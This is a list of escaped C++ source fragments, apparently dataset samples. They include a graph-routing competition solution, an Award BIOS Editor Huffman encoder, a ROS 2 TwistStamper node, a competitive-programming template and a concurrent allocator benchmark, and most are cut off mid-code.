    "/*\n * Description: \u5341\u5206\u7b80\u5355\u7684\u4e00\u79cd\u89e3\u6cd5\uff0c\u4e3b\u8981\u601d\u8def\u662f\u968f\u673a\u751f\u6210\u7a77\u4e3e\u6700\u5927\u5206\u5dee\uff0c\u7136\u540e\u6309\u7167\u5269\u4f59\u8d44\u6e90\u5bfb\u627e\u6700\u77ed\u8def\u5f84\n * Date: 2024-05-18\n */\n#include <iostream>\n#include <string>\n#include <random>\n#include <chrono>\n#include <unordered_set>\n#include <unordered_map>\n#include <queue>\n#include <cassert>\n#include <algorithm>\n#include <map>\n#include <cstring>\n#include <bitset>\n\nusing namespace std;\n\n//\u521b\u5efa\u53c2\u6570\nconst int CREATE_SAMPLE_RANDOM_SEED = 666;//\u521b\u5efa\u6837\u4f8b\u79cd\u5b50\nconst int CREATE_BASE_SAMPLE_CANDIDATE_COUNT = 8;//\u57fa\u7840\u5e8f\u5217\u751f\u6210\uff0c\u5019\u9009\u5e8f\u5217\u4e2a\u6570\nconst int CREATE_OPTIMIZE_SAMPLE_CANDIDATE_COUNT = 3;//\u4f18\u5316\u57fa\u7840\u5e8f\u5217\uff0c\u5019\u9009\u5e8f\u5217\u4e2a\u6570\nconst int CREATE_BASE_EDGE_CANDIDATE_COUNT = 12;//\u57fa\u7840\u5e8f\u5217\u751f\u6210\uff0c\u5019\u9009\u8fb9\u7684\u6761\u6570\nconst int CREATE_OPTIMIZE_EDGE_CANDIDATE_COUNT = 20;//\u4f18\u5316\u57fa\u7840\u5e8f\u5217\uff0c\u5019\u9009\u8fb9\u7684\u6761\u6570\nconst int CREATE_SHUFFLE_MAX_TRY_COUNT = 5;//\u4e0d\u6ee1\u8db3\u76f8\u4f3c\u5ea6\u7ea6\u675f\u65f6\uff0c\u6700\u591a\u5c1d\u8bd5\u51e0\u6b21\uff1f\nconst int CREATE_BASE_SAMPLES_MAX_TIME = 40 * 1000;//\u57fa\u7840\u5e8f\u5217\u751f\u6210\uff0c\u6700\u5927\u8fd0\u884c\u65f6\u95f4\nconst int CREATE_OPTIMIZE_SAMPLES_MAX_TIME = CREATE_BASE_SAMPLES_MAX_TIME + 45 * 1000;//\u4f18\u5316\u57fa\u7840\u5e8f\u5217\uff0c\u6700\u5927\u8fd0\u884c\u65f6\u95f4\n\nconst double MY_SAMPLE_SEARCH_RESOURCE_FACTOR = 1.0;//\u521b\u5efa\u6211\u81ea\u5df1\u6837\u4f8b\u7684\u5bfb\u8def\u56e0\u5b50\nconst double OTHER_SAMPLE_SEARCH_RESOURCE_FACTOR = 1.0;//\u4f18\u5316\u5176\u4ed6\u6837\u4f8b\u7684\u5bfb\u8def\u56e0\u5b50\n\n//\u521b\u5efa\u5e38\u91cf\nconst int CREATE_SAMPLE_COUNT = 30;//\u521b\u5efa\u6837\u4f8b\u6700\u5927\u4e2a\u6570\nconst double CREATE_SAMPLE_SIMILARITY_THRESHOLD = 0.5;//\u76f8\u4f3c\u5ea6\u7ea6\u675f\nconst int EVERY_SCENE_MAX_FAIL_EDGE_COUNT = 60;//\u4e00\u4e2a\u573a\u666f\u573a\u666f\u6700\u5927\u65ad\u8fb9\u6570\n\n//\u8fed\u4ee3\u53c2\u6570\nconst int SEARCH_RANDOM_SEED = 666;//\u641c\u7d22\u79cd\u5b50\nstatic bool IS_ONLINE = true;//\u662f\u5426\u7ebf\u4e0a\uff0c\u53ef\u4ee5\u5145\u5206\u5229\u7528\u65f6\u95f4\u8fed\u4ee3\u4ed6\u7ed9\u7684\u6837\u4f8b\nint MY_CHANGE_CHANNEL_WEIGHT = 1;//\u6211\u7684\u7528\u529b\u5bfb\u8def\u53d8\u901a\u9053\u6743\u91cd\uff0c\u4e5f\u7528\u6765\u8ba1\u7b97\u8d44\u6e90\uff0c\u6700\u597dinit\u76f4\u63a5\u52a8\u6001\u8c03\u6574\u597d\u4e00\u70b9\uff0c\u5b9a\u6b7b\u6548\u679c\u4e0d\u592a\u597d\nint OTHER_CHANGE_CHANNEL_WEIGHT = 1;//\u4ed6\u7684\u6837\u4f8b\u53d8\u901a\u9053\u6743\u91cd\uff0c\u53ea\u662f\u5bfb\u8def\u7528\uff0c\u6700\u597dinit\u76f4\u63a5\u52a8\u6001\u8c03\u6574\u597d\u4e00\u70b9\uff0c\u5b9a\u6b7b\u6548\u679c\u4e0d\u592a\u597d\nconst int EDGE_LENGTH_WEIGHT = 100;//\u8fb9\u7684\u6743\u91cd\uff0c\u57fa\u672c\u53ef\u4ee5\u4e0d\u6539\u53d8\n\n//\u641c\u7d22\u5e38\u91cf\nstatic int MAX_E_FAIL_COUNT = 4200;//\u4ed6\u7684\u7684\u6837\u4f8b\u7684\u6700\u5927\u65ad\u8fb9\u6570\uff0c\u6700\u5927\u65ad\u8fb9\u65705k\nconst int SEARCH_TIME = 90 * 1000;//\u7a0b\u5e8f\u6574\u4f53\u8fd0\u884c\u65f6\u95f4\n\n//\u5176\u4ed6\u5e38\u91cf\nconst int MAX_M = 1000;\nconst int MAX_N = 200;\nconst int CHANNEL_COUNT = 40;\nconst auto programStartTime = std::chrono::steady_clock::now();\nconst int INT_INF = 0x7f7f7f7f;\n\ninline int runtime() {\n    auto now = std::chrono::steady_clock::now();\n    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - programStartTime);\n    return int(duration.count());\n}\n\n//\u8fb9\nstruct Edge {\n    int from{};\n    int to{};\n    bool die{};\n    int channel[CHANNEL_COUNT + 1]{};//0\u53f7\u4e0d\u7528\n    int freeChannelTable[CHANNEL_COUNT + 1][CHANNEL_COUNT + 1]{};//\u6253\u8868\u52a0\u5feb\u641c\u7d22\u901f\u5ea6\n    bitset<(CHANNEL_COUNT + 1) * (CHANNEL_COUNT + 1)> widthChannelTable;//\u6307\u793a\u67d0\u4e2a\u5bbd\u5ea6\u67d0\u6761\u901a\u9053\u662f\u5426\u88ab\u5360\u7528\n    Edge() {\n        memset(channel, -1, sizeof(channel));\n    }\n\n    void reset() {\n        memset(channel, -1, sizeof(channel));\n        die = false;//\u6ca1\u6709\u65ad\u6389\n    }\n};\n\n//\u90bb\u63a5\u8868\u7684\u8fb9\nstruct NearEdge {\n    int id;\n    int to;\n};\n\n//\u4e1a\u52a1\nstruct Business {\n    int id{};\n    int from{};\n    int to{};\n    int needChannelLength{};\n    int value{};\n    bool die{};\n\n    void reset() {\n        die = false;\n    }\n\n};\n\n//\u9876\u70b9\nstruct Vertex {\n    int maxChangeCount{};\n    int curChangeCount{};\n    unordered_set<int> changeBusIds;\n    int hotWeight{};\n    bool die{};//\u5047\u8bbe\u6b7b\u4ea1\u4e0d\u4f1a\u53d8\u4e1a\u52a1,\u6709\u53d8\u901a\u9053\u6b21\u6570\u4e14\u4e0ddie\n\n    void reset() {\n        curChangeCount = maxChangeCount;\n        changeBusIds.clear();\n        die = false;\n    }\n};\n\n//\u7b56\u7565\u7c7b\nstruct Strategy {\n    int N{};//\u8282\u70b9\u6570\n    int M{};//\u8fb9\u6570\n    default_random_engine createSampleRad{CREATE_SAMPLE_RANDOM_SEED};\n    default_random_engine searchRad{SEARCH_RANDOM_SEED};\n    vector<Edge> edges;\n    vector<Vertex> vertices;\n    vector<vector<NearEdge>> graph;//\u90bb\u63a5\u8868\n    vector<NearEdge> searchGraph[MAX_N + 1];//\u90bb\u63a5\u8868\n    vector<NearEdge> baseSearchGraph[MAX_N + 1];//baseline\u7684\u90bb\u63a5\u8868\n    vector<Business> buses;//\u4e1a\u52a1\n    struct Point {\n        int edgeId;\n        int startChannelId;\n        int endChannelId;\n    };\n    vector<vector<Point>> busesOriginResult;//\u4e1a\u52a1\u6700\u5f00\u59cb\u8def\u5f84\n    int minDistance[MAX_N + 1][MAX_N + 1]{};//\u7528\u4e8eaStar\u542f\u53d1\n    int searchTime = 0; //\u7edf\u8ba1\u5bfb\u8def\u65f6\u95f4\n    int curHandleCount = 0;//\u76ee\u524d\u5904\u7406\u7684\u4ed6\u7ed9\u7684\u65ad\u8fb9\u603b\u4f53\u4e2a\u6570\n    double resultScore[2]{}; //\u5206\u6570\uff0c0\u6700\u5927\u5206\u6570\uff0c1\u5f53\u524d\u5206\u6570\n    int totalResource = 0;//\u603b\u4f53\u8d44\u6e90\n    int remainResource = 0;//\u5f53\u524d\u5269\u4f59\u8d44\u6e90\n    int totalEdgeValue = 0;//\u8fb9\u4e0a\u7684\u603b\u4f53\u4ef7\u503c\uff0c\u53ef\u4ee5\u53e0\u52a0\n    double remainEdgeValue = 0;//\u5269\u4f59\u7684\u8fb9\u4e0a\u7684\u4ef7\u503c\n    double remainEdgeSize = 0;//\u5269\u4f59\u5b58\u6d3b\u7684\u8fb9\u6570\n    double curAffectEdgeValue = 0;//\u5f53\u524d\u65ad\u8fb9\u5f71\u54cd\u7684\u8fb9\u4e0a\u7684\u4ef7\u503c\n    double avgEdgeAffectValue = 0;//\u5e73\u5747\u65ad\u4e00\u6761\u8fb9\u5f71\u54cd\u7684\u4ef7\u503c\uff0c\u6700\u5f00\u59cb\u8ba1\u7b97\u4e00\u8fb9\n    int createScores[MAX_M + 1]{};//\u751f\u6210\u57fa\u7840\u6253\u5206\n    vector<vector<int>> baseRepValue[MAX_M + 1];//base\u5bfb\u5230\u7684\u8def\u5f84\uff0c\u5e94\u8be5\u589e\u52a0\u7684\u5206\u8ba9\u4ed6\u540e\u9762\u65ad\u6389\n    vector<vector<int>> meRepValue[MAX_M + 1];//\u6211\u5bfb\u5230\u7684\u8def\u5f84\uff0c\u5e94\u8be5\u51cf\u5c11\u5206\uff0c\u8ba9\u4ed6\u5b58\u6d3b\n    vector<vector<int>> baseOriginValue[MAX_M + 1];//base\u5bfb\u4e0d\u5230\u7684\u8def\u5f84\uff0c\u5e94\u8be5\u51cf\u5c11\u5206\uff0c\u56e0\u4e3a\u6b7b\u4ea1\u4e86\u4e0d\u91cd\u590d\u65ad\n\n    struct SearchUtils {\n\n        //baseLine\u5bfb\u8def\n        inline static vector<Point>\n        baseFind(int start, int end, int width, const vector<NearEdge> searchGraph[MAX_N + 1],\n                 const vector<Edge> &edges) {\n            struct Common {\n                int timestamp;\n                int parentEdgeId;\n            };\n            static Common common[CHANNEL_COUNT + 1][MAX_N + 1];\n            static int timestampId = 1;//\u8ddd\u79bb\n            timestampId++;\n            int endChannel = -1;\n            queue<int> q;\n            for (int i = 1; i <= CHANNEL_COUNT; ++i) {\n                common[i][start].timestamp = timestampId;\n                q.emplace((i << 16) + start);\n        ",
    "//\n// Award BIOS Editor - huf.cpp\n// [ static Huffman ]\n//\n// $Id: huf.cpp,v 1.3 2004/04/11 07:17:16 bpoint Exp $\n//\n//----------------------------------------------------------------------------\n//\n// Award BIOS Editor's LZH Engine was adapted from \"ar\" archiver written by \n// Haruhiko Okumura.\n//\n\n#include <stdlib.h>\n#include <stdint.h>\n#include \"lzhEngine.h\"\n\n#define NP (DICBIT + 1)\n#define NT (CODE_BIT + 3)\n#define PBIT 4  /* smallest integer such that (1U << PBIT) > NP */\n#define TBIT 5  /* smallest integer such that (1U << TBIT) > NT */\n#if NT > NP\n\t#define NPT NT\n#else\n\t#define NPT NP\n#endif\n\nushort left[2 * NC - 1], right[2 * NC - 1];\nstatic uchar *buf, c_len[NC], pt_len[NPT];\nstatic ushort bufsiz = 0, blocksize;\nstatic ushort c_freq[2 * NC - 1], c_table[4096], c_code[NC],\n\t\t\t  p_freq[2 * NP - 1], pt_table[256], pt_code[NPT],\n\t\t\t  t_freq[2 * NT - 1];\n\n/***** encoding *****/\n\nstatic void count_t_freq(void)\n{\n\tushort i, k, n, count;\n\n\tfor (i = 0; i < NT; i++) t_freq[i] = 0;\n\tn = NC;\n\twhile (n > 0 && c_len[n - 1] == 0) n--;\n\ti = 0;\n\twhile (i < n) {\n\t\tk = c_len[i++];\n\t\tif (k == 0) {\n\t\t\tcount = 1;\n\t\t\twhile (i < n && c_len[i] == 0) {  i++;  count++;  }\n\t\t\tif (count <= 2) t_freq[0] += count;\n\t\t\telse if (count <= 18) t_freq[1]++;\n\t\t\telse if (count == 19) {  t_freq[0]++;  t_freq[1]++;  }\n\t\t\telse t_freq[2]++;\n\t\t} else t_freq[k + 2]++;\n\t}\n}\n\nstatic void write_pt_len(uint8_t n, uint8_t nbit, int i_special) \n{\n\tushort i, k;\n\n\twhile (n > 0 && pt_len[n - 1] == 0) n--;\n\tputbits(nbit, n);\n\ti = 0;\n\twhile (i < n) {\n\t\tk = pt_len[i++];\n\t\tif (k <= 6) putbits(3, k);\n\t\telse putbits(k - 3, static_cast<uint16_t>((1U << (k - 3)) - 2));\n\t\tif (i == i_special) {\n\t\t\twhile (i < 6 && pt_len[i] == 0) i++;\n\t\t\tputbits(2, (i - 3) & 3);\n\t\t}\n\t}\n}\n\nstatic void write_c_len(void)\n{\n\tushort i, k, n, count;\n\n\tn = NC;\n\twhile (n > 0 && c_len[n - 1] == 0) n--;\n\tputbits(CBIT, n);\n\ti = 0;\n\twhile (i < n) {\n\t\tk = c_len[i++];\n\t\tif (k == 0) {\n\t\t\tcount = 1;\n\t\t\twhile (i < n && c_len[i] == 0) {  i++;  count++;  }\n\t\t\tif (count <= 2) {\n\t\t\t\tfor (k = 0; k < count; k++)\n\t\t\t\t\tputbits(pt_len[0], pt_code[0]);\n\t\t\t} else if (count <= 18) {\n\t\t\t\tputbits(pt_len[1], pt_code[1]);\n\t\t\t\tputbits(4, count - 3);\n\t\t\t} else if (count == 19) {\n\t\t\t\tputbits(pt_len[0], pt_code[0]);\n\t\t\t\tputbits(pt_len[1], pt_code[1]);\n\t\t\t\tputbits(4, 15);\n\t\t\t} else {\n\t\t\t\tputbits(pt_len[2], pt_code[2]);\n\t\t\t\tputbits(CBIT, count - 20);\n\t\t\t}\n\t\t} else putbits(pt_len[k + 2], pt_code[k + 2]);\n\t}\n}\n\nstatic void encode_c(int c)\n{\n\tputbits(c_len[c], c_code[c]);\n}\n\nstatic void encode_p(ushort p)\n{\n\tushort c, q;\n\n\tc = 0;  q = p;  while (q) {  q >>= 1;  c++;  }\n\tputbits(pt_len[c], pt_code[c]);\n\tif (c > 1) putbits(c - 1, p & (0xFFFFU >> (17 - c)));\n}\n\nstatic void send_block(void)\n{\n\tushort i, k, flags, root, pos, size;\n\n\troot = make_tree(NC, c_freq, c_len, c_code);\n\tsize = c_freq[root];  putbits(16, size);\n\tif (root >= NC) {\n\t\tcount_t_freq();\n\t\troot = make_tree(NT, t_freq, pt_len, pt_code);\n\t\tif (root >= NT) {\n\t\t\twrite_pt_len(NT, TBIT, 3);\n\t\t} else {\n\t\t\tputbits(TBIT, 0);  putbits(TBIT, root);\n\t\t}\n\t\twrite_c_len();\n\t} else {\n        putbits(TBIT, 0);  putbits(TBIT, 0);\n\t\tputbits(CBIT, 0);  putbits(CBIT, root);\n\t}\n\troot = make_tree(NP, p_freq, pt_len, pt_code);\n\tif (root >= NP) {\n\t\twrite_pt_len(NP, PBIT, -1);\n\t} else {\n\t\tputbits(PBIT, 0);  putbits(PBIT, root);\n\t}\n\tpos = 0;\n\tfor (i = 0; i < size; i++) {\n\t\tif (i % CHAR_BIT == 0) flags = buf[pos++];  else flags <<= 1;\n\t\tif (flags & (1U << (CHAR_BIT - 1))) {\n\t\t\tencode_c(buf[pos++] + (1U << CHAR_BIT));\n\t\t\tk = static_cast<uint16_t>(buf[pos++] << CHAR_BIT);  k += buf[pos++];\n\t\t\tencode_p(k);\n\t\t} else encode_c(buf[pos++]);\n\t\tif (unpackable) return;\n\t}\n\tfor (i = 0; i < NC; i++) c_freq[i] = 0;\n\tfor (i = 0; i < NP; i++) p_freq[i] = 0;\n}\n\nstatic ushort output_pos, output_mask;\n\nvoid output(ushort c, ushort p)\n{\n\tstatic ushort cpos;\n\n\tif ((output_mask >>= 1) == 0) {\n\t\toutput_mask = 1U << (CHAR_BIT - 1);\n\t\tif (output_pos >= bufsiz - 3 * CHAR_BIT) {\n\t\t\tsend_block();\n\t\t\tif (unpackable) return;\n\t\t\toutput_pos = 0;\n\t\t}\n\t\tcpos = output_pos++;  buf[cpos] = 0;\n\t}\n\tbuf[output_pos++] = (uchar) c;  c_freq[c]++;\n\tif (c >= (1U << CHAR_BIT)) {\n\t\tbuf[cpos] |= output_mask;\n\t\tbuf[output_pos++] = (uchar)(p >> CHAR_BIT);\n\t\tbuf[output_pos++] = (uchar) p;\n\t\tc = 0;  while (p) {  p >>= 1;  c++;  }\n\t\tp_freq[c]++;\n\t}\n}\n\nvoid huf_encode_start(void)\n{\n\tushort i;\n\n\tif (bufsiz == 0) {\n\t\tbufsiz = 16 * 1024U;\n\t\twhile ((buf = (uchar *)malloc(bufsiz)) == NULL) {\n\t\t\tbufsiz = (bufsiz / 10U) * 9U;\n\n\t\t\tif (bufsiz < 4 * 1024U)\n\t\t\t{\n//\t\t\t\terror(\"Out of memory.\");\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n\tbuf[0] = 0;\n\tfor (i = 0; i < NC; i++) c_freq[i] = 0;\n\tfor (i = 0; i < NP; i++) p_freq[i] = 0;\n\toutput_pos = output_mask = 0;\n\tinit_putbits();\n}\n\nvoid huf_encode_end(void)\n{\n\tif (! unpackable) {\n\t\tsend_block();\n\t\tputbits(CHAR_BIT - 1, 0);  /* flush remaining bits */\n\t}\n}\n\n/***** decoding *****/\n\nstatic void read_pt_len(uint8_t nn, uint8_t nbit, uint16_t i_special)\n{\n\tint i, c, n;\n\tuint16_t mask;\n\n\tn = getbits(nbit);\n\tif (n == 0) {\n\t\tc =",
    "#include <memory>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include <geometry_msgs/msg/twist.hpp>\n#include <geometry_msgs/msg/twist_stamped.hpp>\n\nclass TwistStamper : public rclcpp::Node\n{\n\npublic:\n    TwistStamper() : Node(\"twist_stamper_cpp\")\n    {\n        \n        this->declare_parameter(\"frame_id\", \"base_link\");\n\n        cmd_vel_sub_ = this->create_subscription<geometry_msgs::msg::Twist>(\n            \"cmd_vel_in\", rclcpp::SystemDefaultsQoS(),\n            std::bind(&TwistStamper::topic_callback, this, std::placeholders::_1)\n        );\n        \n        cmd_vel_stamped_pub_ = this->create_publisher<geometry_msgs::msg::TwistStamped>(\n            \"cmd_vel_out\", rclcpp::QoS(rclcpp::KeepLast(1))\n        );\n\n    }\n\n    void topic_callback(const geometry_msgs::msg::Twist::ConstSharedPtr &twist)\n    {\n        geometry_msgs::msg::TwistStamped empty_twist_stamped;\n\n        empty_twist_stamped.header.stamp = this->get_clock()->now();\n        empty_twist_stamped.header.frame_id = this->get_parameter(\"frame_id\").as_string();\n        empty_twist_stamped.twist = *twist;\n        cmd_vel_stamped_pub_->publish(empty_twist_stamped);\n\n    }\n\nprivate:\n    rclcpp::Subscription<geometry_msgs::msg::Twist>::SharedPtr cmd_vel_sub_;\n    rclcpp::Publisher<geometry_msgs::msg::TwistStamped>::SharedPtr cmd_vel_stamped_pub_;\n};\n\nint main(int argc, char *argv[])\n{\n    rclcpp::init(argc, argv);\n    rclcpp::spin(std::make_shared<TwistStamper>());\n    rclcpp::shutdown();\n    return 0;\n}",
    "#define _CRT_NONSTDC_NO_WARNINGS\n#define _SILENCE_CXX17_ITERATOR_BASE_CLASS_DEPRECATION_WARNING\n#include <bits/stdc++.h>\n#include <random>\n#include <unordered_set>\n#include <array>\n#include <optional>\n#ifdef _MSC_VER\n#include <opencv2/core.hpp>\n#include <opencv2/core/utils/logger.hpp>\n#include <opencv2/imgproc.hpp>\n#include <opencv2/highgui.hpp>\n#include <conio.h>\n#include <ppl.h>\n#include <filesystem>\n#include <intrin.h>\n#include <omp.h>\n/* g++ functions */\nint __builtin_clz(unsigned int n) { unsigned long index; _BitScanReverse(&index, n); return 31 - index; }\nint __builtin_ctz(unsigned int n) { unsigned long index; _BitScanForward(&index, n); return index; }\nnamespace std { inline int __lg(int __n) { return sizeof(int) * 8 - 1 - __builtin_clz(__n); } }\nint __builtin_popcount(int bits) {\n    bits = (bits & 0x55555555) + (bits >> 1 & 0x55555555);\n    bits = (bits & 0x33333333) + (bits >> 2 & 0x33333333);\n    bits = (bits & 0x0f0f0f0f) + (bits >> 4 & 0x0f0f0f0f);\n    bits = (bits & 0x00ff00ff) + (bits >> 8 & 0x00ff00ff);\n    return (bits & 0x0000ffff) + (bits >> 16 & 0x0000ffff);\n}\n/* enable __uint128_t in MSVC */\n//#include <boost/multiprecision/cpp_int.hpp>\n//using __uint128_t = boost::multiprecision::uint128_t;\n#endif\n\n/** compro io **/\nnamespace aux {\n    template<typename T, unsigned N, unsigned L> struct tp { static void output(std::ostream& os, const T& v) { os << std::get<N>(v) << \", \"; tp<T, N + 1, L>::output(os, v); } };\n    template<typename T, unsigned N> struct tp<T, N, N> { static void output(std::ostream& os, const T& v) { os << std::get<N>(v); } };\n}\ntemplate<typename... Ts> std::ostream& operator<<(std::ostream& os, const std::tuple<Ts...>& t) { os << '['; aux::tp<std::tuple<Ts...>, 0, sizeof...(Ts) - 1>::output(os, t); return os << ']'; } // tuple out\ntemplate<class Ch, class Tr, class Container> std::basic_ostream<Ch, Tr>& operator<<(std::basic_ostream<Ch, Tr>& os, const Container& x); // container out (fwd decl)\ntemplate<class S, class T> std::ostream& operator<<(std::ostream& os, const std::pair<S, T>& p) { return os << \"[\" << p.first << \", \" << p.second << \"]\"; } // pair out\ntemplate<class S, class T> std::istream& operator>>(std::istream& is, std::pair<S, T>& p) { return is >> p.first >> p.second; } // pair in\nstd::ostream& operator<<(std::ostream& os, const std::vector<bool>::reference& v) { os << (v ? '1' : '0'); return os; } // bool (vector) out\nstd::ostream& operator<<(std::ostream& os, const std::vector<bool>& v) { bool f = true; os << \"[\"; for (const auto& x : v) { os << (f ? \"\" : \", \") << x; f = false; } os << \"]\"; return os; } // vector<bool> out\ntemplate<class Ch, class Tr, class Container> std::basic_ostream<Ch, Tr>& operator<<(std::basic_ostream<Ch, Tr>& os, const Container& x) { bool f = true; os << \"[\"; for (auto& y : x) { os << (f ? \"\" : \", \") << y; f = false; } return os << \"]\"; } // container out\ntemplate<class T, class = decltype(std::begin(std::declval<T&>())), class = typename std::enable_if<!std::is_same<T, std::string>::value>::type> std::istream& operator>>(std::istream& is, T& a) { for (auto& x : a) is >> x; return is; } // container in\ntemplate<typename T> auto operator<<(std::ostream& out, const T& t) -> decltype(out << t.stringify()) { out << t.stringify(); return out; } // struct (has stringify() func) out\n/** io setup **/\nstruct IOSetup { IOSetup(bool f) { if (f) { std::cin.tie(nullptr); std::ios::sync_with_stdio(false); } std::cout << std::fixed << std::setprecision(15); } }\niosetup(true); // set false when solving interective problems\n/** string formatter **/\ntemplate<typename... Ts> std::string format(const std::string& f, Ts... t) { size_t l = std::snprintf(nullptr, 0, f.c_str(), t...); std::vector<char> b(l + 1); std::snprintf(&b[0], l + 1, f.c_str(), t...); return std::string(&b[0], &b[0] + l); }\n/** dump **/\n//#ifdef _MSC_VER\n#define ENABLE_DUMP\n//#endif\n#ifdef ENABLE_DUMP\n#define DUMPOUT std::cerr\nstd::ostringstream DUMPBUF;\n#define dump(...) do{DUMPBUF<<\"  \";DUMPBUF<<#__VA_ARGS__<<\" :[DUMP - \"<<__LINE__<<\":\"<<__FUNCTION__<<\"]\"<<std::endl;DUMPBUF<<\"    \";dump_func(__VA_ARGS__);DUMPOUT<<DUMPBUF.str();DUMPBUF.str(\"\");DUMPBUF.clear();}while(0);\nvoid dump_func() { DUMPBUF << std::endl; }\ntemplate <class Head, class... Tail> void dump_func(Head&& head, Tail&&... tail) { DUMPBUF << head; if (sizeof...(Tail) == 0) { DUMPBUF << \" \"; } else { DUMPBUF << \", \"; } dump_func(std::move(tail)...); }\n#else\n#define dump(...) void(0);\n#endif\n/** timer **/\nclass Timer {\n    double t = 0, paused = 0, tmp;\npublic:\n    Timer() { reset(); }\n    static double time() {\n#ifdef _MSC_VER\n        return __rdtsc() / 2.8e9;\n#else\n        unsigned long long a, d;\n        __asm__ volatile(\"rdtsc\"\n            : \"=a\"(a), \"=d\"(d));\n        return (d << 32 | a) / 2.8e9;\n#endif\n    }\n    void reset() { t = time(); }\n    void pause() { tmp = time(); }\n    void restart() { paused += time() - tmp; }\n    double elapsed_ms() const { return (time() - t - paused) * 1000.0; }\n};\n/** rand **/\nst",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#define _CRT_SECURE_NO_WARNINGS\r\n#include\"ConcurrentAlloc.h\"\r\n//#include \"Logging.h\" // \u5305\u542b\u65e5\u5fd7\u8bb0\u5f55\u5934\u6587\u4ef6\r\n// ntimes \u4e00\u8f6e\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u7684\u6b21\u6570\r\n// rounds \u8f6e\u6b21\r\nvoid BenchmarkMalloc(size_t ntimes, size_t nworks, size_t rounds)\r\n{\r\n\tstd::vector<std::thread> vthread(nworks);\r\n\tstd::atomic<size_t> malloc_costtime = 0;\r\n\tstd::atomic<size_t> free_costtime = 0;\r\n\r\n\tfor (size_t k = 0; k < nworks; ++k)\r\n\t{\r\n\t\tvthread[k] = std::thread([&, k]() {\r\n\t\t\tstd::vector<void*> v;\r\n\t\t\tv.reserve(ntimes);\r\n\r\n\t\t\tfor (size_t j = 0; j < rounds; ++j)\r\n\t\t\t{\r\n\t\t\t\tsize_t begin1 = clock();\r\n\t\t\t\tfor (size_t i = 0; i < ntimes; i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tv.push_back(malloc(16));\r\n\t\t\t\t\t//v.push_back(malloc((16 + i) % 8192 + 1));\r\n\t\t\t\t}\r\n\t\t\t\tsize_t end1 = clock();\r\n\r\n\t\t\t\tsize_t begin2 = clock();\r\n\t\t\t\tfor (size_t i = 0; i < ntimes; i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tfree(v[i]);\r\n\t\t\t\t}\r\n\t\t\t\tsize_t end2 = clock();\r\n\t\t\t\tv.clear();\r\n\r\n\t\t\t\tmalloc_costtime += (end1 - begin1);\r\n\t\t\t\tfree_costtime += (end2 - begin2);\r\n\t\t\t}\r\n\t\t\t});\r\n\t}\r\n\r\n\tfor (auto& t : vthread)\r\n\t{\r\n\t\tt.join();\r\n\t}\r\n\r\n\t//printf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21malloc %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t//\tnworks, rounds, ntimes, malloc_costtime);\r\n\r\n\t//printf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21free %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t//\tnworks, rounds, ntimes, free_costtime);\r\n\r\n\t//printf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1malloc&free %u\u6b21\uff0c\u603b\u8ba1\u82b1\u8d39\uff1a%u ms\\n\",\r\n\t//\tnworks, nworks * rounds * ntimes, malloc_costtime + free_costtime);\r\n\tprintf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21malloc %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t\t(unsigned int)nworks, (unsigned int)rounds, (unsigned int)ntimes, (unsigned int)malloc_costtime);\r\n\r\n\tprintf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c%u\u8f6e\u6b21\uff0c\u6bcf\u8f6e\u6b21free %u\u6b21: \u82b1\u8d39\uff1a%u ms\\n\",\r\n\t\t(unsigned int)nworks, (unsigned int)rounds, (unsigned int)ntimes, (unsigned int)free_costtime);\r\n\r\n\tprintf(\"%u\u4e2a\u7ebf\u7a0b\u5e76\u53d1malloc&free %u\u6b21\uff0c\u603b\u8ba1\u82b1\u8d39\uff1a%u ms\\n\",\r\n\t\t(unsigned int)nworks, (unsigned int)(nworks * rounds * ntimes), (unsigned int)(malloc_costtime + free_costtime));\r\n}\r\n\r\n\r\n// \u5355\u8f6e\u6b21\u7533\u8bf7\u91ca\u653e\u6b21\u6570 \u7ebf\u7a0b\u6570 \u8f6e\u6b21\r\nvoid BenchmarkConcurrentMalloc(size_t ntimes, size_t nworks, size_t rounds)\r\n{\r\n\tstd::vector<std::thread> vthread(nworks);\r\n\tstd::atomic<size_t> malloc_costtime = 0;\r\n\tstd::atomic<size_t> free_costtime = 0;\r\n\r\n\tfor (size_t k = 0; k < nworks; ++k)\r\n\t{\r\n\t\tvthread[k] = std::thread([&]() {\r\n\t\t\tstd::vector<void*> v;\r\n\t\t\tv.reserve(ntimes);\r\n\r\n\t\t\tfor (size_t j = 0; j < rounds; ++j)\r\n\t\t\t{\r\n\t\t\t\tsize_t begin1 = clock();\r\n\t\t\t\tfor (size_t i = 0; i < ntimes; i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tv.push_back(ConcurrentAlloc(16));\r\n\t\t\t\t\t//v.push_back(ConcurrentAlloc((16 + i) % 8192 + 1));\r\n\t\t\t\t}\r\n\t\t\t\tsize_t end1 = clock();\r\n\r\n\t\t\t\tsize_t begin2 = clock();\r\n\t\t\t\tfor (size_t i = 0; i < ntimes; i++)\r\n\t\t\t\t{\r\n\t\t\t\t\tConcurrentFree(v[i]);\r\n\t\t\t\t}\r\n\t\t\t\tsize_t end2 = clock();\r\n\t\t\t\tv.clear();\r\n\r\n\t\t\t\tmalloc_costtime += (end1 - begin1);\r\n\t\t\t\tfree_costtime += (end2 - begin2);\r\n\t\t\t}\r\n\t\t\t});\r\n\t}\r\n\r\n\tfor (auto& t : 